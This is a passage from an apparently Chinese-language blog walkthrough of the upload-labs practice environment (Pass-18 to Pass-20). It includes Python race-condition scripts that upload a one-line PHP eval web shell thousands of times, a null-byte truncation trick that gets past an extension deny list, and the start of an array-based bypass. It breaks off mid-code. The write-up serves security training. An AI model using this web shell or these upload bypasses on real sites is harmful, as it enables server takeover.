&lt;p&gt;那么我们可以写成：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;backdoor.php.aaa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同样是条件漏洞线程攻击即可生成uploadbackdoor.php.aaa&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004151006998.png&#34; alt=&#34;image-20221004151006998&#34;&gt;&lt;/p&gt;
&lt;p&gt;附上代码：&lt;/p&gt;
&lt;p&gt;第一个线程池上传&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; hackhttp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; multiprocessing.dummy &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Pool &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; ThreadPool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;lists&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hh = hackhttp.hackhttp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    raw = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;POST /Pass-18/index.php HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Host: www.upload_lab.com&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Referer: http://www.upload_lab.com/Pass-18/index.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Connection: keep-alive&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: multipart/form-data; boundary=---------------------------8116162727142&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Length: 342&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------8116162727142&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Disposition: form-data; name=&amp;quot;upload_file&amp;quot;; filename=&amp;quot;backdoor.php.aaa&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: application/octet-stream&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;?php @eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------8116162727142&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;submit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------8116162727142--&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code,head,html,redirect,log = hh.http(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.upload_lab.com/Pass-18/index.php&amp;#x27;&lt;/span&gt;,raw=raw)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool = ThreadPool(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(upload,&lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10000&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.join()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第二个线程池请求访问&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; hackhttp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; multiprocessing.dummy &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Pool &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; ThreadPool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;lists&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hh = hackhttp.hackhttp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code,head,html,redirect,log = hh.http(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.upload_lab.com/upload/backdoor.php.aaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool = ThreadPool(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(upload,&lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;15000&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.join()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但其实，经过试验后，Pass18的攻击代码同样也对Pass19适用，分析原因是因为：&lt;/p&gt;
&lt;p&gt;整体详细点是分了5个部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;isUploadedFile()&lt;/code&gt;判断是否是POST请求上传的文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setDir()&lt;/code&gt;设置路径&lt;/li&gt;
&lt;li&gt;&lt;code&gt;checkExtension()&lt;/code&gt;检查白名单后缀&lt;/li&gt;
&lt;li&gt;&lt;code&gt;move()&lt;/code&gt; 复制到永久目录中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;renamefile()&lt;/code&gt; 重命名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这&lt;code&gt;步骤1&lt;/code&gt;、&lt;code&gt;步骤2&lt;/code&gt;到&lt;code&gt;步骤3&lt;/code&gt;之间也相差一段时间，那么完全可以上传php文件来进行条件竞争访问，生成&lt;code&gt;shell.php&lt;/code&gt;，后面就无所谓&lt;code&gt;backdoor.php&lt;/code&gt;被删除了。&lt;/p&gt;
&lt;h2 id=&#34;利用00截断绕过特定检查&#34;&gt;&lt;a href=&#34;#利用00截断绕过特定检查&#34; class=&#34;headerlink&#34; title=&#34;利用00截断绕过特定检查&#34;&gt;&lt;/a&gt;利用00截断绕过特定检查&lt;/h2&gt;&lt;p&gt;依旧看Pass-19的源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;pathinfo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;,PATHINFO_EXTENSION);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//关键漏洞点在以下几句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;禁止保存为该类型文件！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞点在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;in_array&lt;/code&gt;去黑名单里寻找看是否存在，不存在则继续。&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;move_uploaded_file&lt;/code&gt;来复制临时文件到永久目录&lt;ul&gt;
&lt;li&gt;而永久目录的&lt;code&gt;file_name&lt;/code&gt;变量来自于&lt;code&gt;POST&lt;/code&gt;请求的&lt;code&gt;save_name&lt;/code&gt;参数，这是&lt;strong&gt;可控点&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;绕过如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;修改&lt;code&gt;backdoor.php&lt;/code&gt;为&lt;code&gt;backdoor.jpg&lt;/code&gt;绕过步骤1&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;POST-00截断&lt;/code&gt;，对&lt;code&gt;save_name&lt;/code&gt;进行路径截断，&lt;code&gt;提前解析成php文件&lt;/code&gt;并保存&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&amp;quot;backdoor.jpg&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;233.php+upload-19.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004152505861.png&#34; alt=&#34;image-20221004152505861&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改为00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004152536573.png&#34; alt=&#34;image-20221004152536573&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功，菜刀连接即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004152809391.png&#34; alt=&#34;image-20221004152809391&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用数组-windows特性绕过&#34;&gt;&lt;a href=&#34;#利用数组-windows特性绕过&#34; class=&#34;headerlink&#34; title=&#34;利用数组+windows特性绕过&#34;&gt;&lt;/a&gt;利用数组+windows特性绕过&lt;/h2&gt;&lt;p&gt;直接看源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//检查MIME&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$allow_type&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;image/jpeg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;image/gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;variable&#34;&gt;$allow_type&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;禁止上传该类型文件!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//检查文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_name&amp;#x27;&lt;/span&gt;]) ? &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;] : &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;is_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;explode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;end&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$allow_suffix&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$allow_suffix&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;禁止上传该后缀文件!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;reset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;) . &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;[&lt;span class=&#34;title function_ invoke__&#34;&gt;count&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = 